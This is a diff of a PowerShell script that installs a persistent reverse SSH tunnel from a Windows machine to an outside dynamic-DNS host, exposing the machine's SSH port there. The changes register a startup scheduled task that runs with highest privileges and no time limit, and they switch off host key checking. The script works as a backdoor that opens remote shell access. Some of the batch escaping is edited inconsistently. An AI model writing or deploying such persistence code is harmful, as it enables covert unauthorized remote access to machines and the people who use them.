@@ -37,11 +37,11 @@ $pubKeyFile = "$keyFile.pub"
 $user = "nobody1"
 $remote_host = "edcoretecmm.sytes.net"
 $receivedPort = 2004
-#$neutralPath = "C:\ProgramData\revssh"
+$neutralPath = "C:\ProgramData\revssh"
 #$logFile = "$neutralPath\rev_ssh.log"
 $logFile = "$userProfile\rev_ssh.log"
-#$batFilePath = "$neutralPath\rev_ssh.bat"
-$batFilePath = "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rev_ssh.bat"
+$batFilePath = "$neutralPath\rev_ssh.bat"
+#$batFilePath = "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rev_ssh.bat"
 
 # Create C:\ProgramData\revssh if it doesn't exist
 if (-not (Test-Path $neutralPath)) {
@@ -157,18 +157,18 @@ echo [INFO] Trying reverse SSH tunnel at %%date%% %%time%% by %%USERNAME%% using
 timeout /t 30 /nobreak > nul
 ""C:\ProgramData\ssh_portable\ssh.exe"" -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -f -R $receivedPort`:127.0.0.1`:22 $user@$remote_host >> "$logFile" 2>&1
 if %%ERRORLEVEL%% EQU 0 (
-    echo [SUCCESS] SSH tunnel established successfully at %%date%% %%time%% >> "$logFile"
+    echo [SUCCESS] SSH tunnel established successfully at %date% %time% >> "$logFile"
 ) else (
-    echo [ERROR] SSH tunnel failed with error code %%ERRORLEVEL%% at %%date%% %%time%% >> "$logFile"
+    echo [ERROR] SSH tunnel failed with error code %ERRORLEVEL% at %date%% %time%% >> "$logFile"
 )
 "@
 
 
 # Save the batch file
-Set-Content -Path $batFilePath -Value $batContent -Encoding ASCII
+#Set-Content -Path $batFilePath -Value $batContent -Encoding ASCII
 
 # Run the reverse tunnel .bat file now (optional: comment out if you don't want it to start immediately)
-Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
+#Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
 #Start-Process -FilePath "$batFilePath"
 
 # Try running the powershell command directly
@@ -182,24 +182,32 @@ Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
 #$psi.UseShellExecute = $false
 
 
-#$taskName = "ReverseSSHTunnel"
+$taskName = "ReverseSSHTunnel"
 
 # Define the action to run the reverse SSH tunnel batch file
 #$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$batFilePath`""
+$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$batFilePath`""
 
 # Remove the task if it already exists
-#if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
-#    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
-#}
+if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+}
 
 # Schedule the task
-#$trigger = New-ScheduledTaskTrigger -AtStartup
+$trigger = New-ScheduledTaskTrigger -AtStartup
 # Set ExecutionTimeLimit to zero to indicate no time limit
-#$settings = New-ScheduledTaskSettingsSet `
-#    -StartWhenAvailable `
-#    -AllowStartIfOnBatteries `
-#    -DontStopIfGoingOnBatteries `
-#    -ExecutionTimeLimit ([TimeSpan]::Zero)
+$settings = New-ScheduledTaskSettingsSet `
+    -StartWhenAvailable `
+    -AllowStartIfOnBatteries `
+    -DontStopIfGoingOnBatteries `
+    -ExecutionTimeLimit ([TimeSpan]::Zero)
+
+Register-ScheduledTask -TaskName $taskName `
+    -Trigger $trigger `
+    -Action $action `
+    -Settings $settings `
+    -RunLevel Highest
+
 
 #Register-ScheduledTask -TaskName $taskName `
 #    -Trigger $trigger `
